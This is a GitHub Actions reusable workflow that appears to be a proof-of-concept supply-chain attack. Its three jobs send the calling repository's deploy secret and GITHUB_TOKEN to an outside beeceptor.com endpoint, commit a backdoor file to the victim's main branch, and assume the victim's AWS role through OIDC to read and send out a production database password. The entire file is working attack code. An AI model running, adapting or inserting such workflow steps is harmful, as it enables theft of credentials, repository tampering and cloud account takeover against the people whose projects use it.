name: reusable
on:
  workflow_call:
    inputs:
      aws_role: { required: false, type: string }
    secrets:
      DEPLOY_SECRET: { required: false }
env:
  BEE: https://ttstaqwtq.free.beeceptor.com
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: STEAL secret and GITHUB_TOKEN
        env:
          DS: ${{ secrets.DEPLOY_SECRET }}
          TK: ${{ github.token }}
        run: |
          curl -s -X POST "$BEE" -H "Content-Type: application/json" \
            --data "{\"scenario\":\"SECRET+TOKEN THEFT\",\"repo\":\"${{ github.repository }}\",\"stolen_secret\":\"$DS\",\"github_token\":\"$TK\"}"
      - name: BACKDOOR the victim repo
        run: |
          B64=$(printf 'backdoored via shadow .github hijack' | base64 -w0)
          CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PUT -H "Authorization: Bearer ${{ github.token }}" \
            "https://api.github.com/repos/${{ github.repository }}/contents/HIJACK_BACKDOOR.md" \
            -d "{\"message\":\"backdoor\",\"content\":\"$B64\",\"branch\":\"main\"}")
          curl -s -X POST "$BEE" -H "Content-Type: application/json" \
            --data "{\"scenario\":\"REPO BACKDOOR\",\"repo\":\"${{ github.repository }}\",\"write_http\":\"$CODE\"}"
      - name: CLOUD TAKEOVER assume AWS role and read secret
        run: |
          set +e
          R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
          JWT=$(echo "$R" | jq -r .value)
          CREDS=$(aws sts assume-role-with-web-identity --role-arn "${{ inputs.aws_role }}" --role-session-name shadow --web-identity-token "$JWT" --duration-seconds 900 2>&1)
          export AWS_ACCESS_KEY_ID="$(echo "$CREDS"|jq -r .Credentials.AccessKeyId 2>/dev/null)" AWS_SECRET_ACCESS_KEY="$(echo "$CREDS"|jq -r .Credentials.SecretAccessKey 2>/dev/null)" AWS_SESSION_TOKEN="$(echo "$CREDS"|jq -r .Credentials.SessionToken 2>/dev/null)" AWS_DEFAULT_REGION=us-east-1
          WHO=$(aws sts get-caller-identity 2>&1)
          SECRET=$(aws ssm get-parameter --name /poc/victim/prod-db-password --with-decryption --query Parameter.Value --output text 2>&1)
          curl -s -X POST "$BEE" -H "Content-Type: application/json" \
            --data "$(jq -nc --argjson w "$WHO" --arg s "$SECRET" '{scenario:"CLOUD TAKEOVER",assumed_aws_identity:$w,stolen_aws_secret:$s}')"
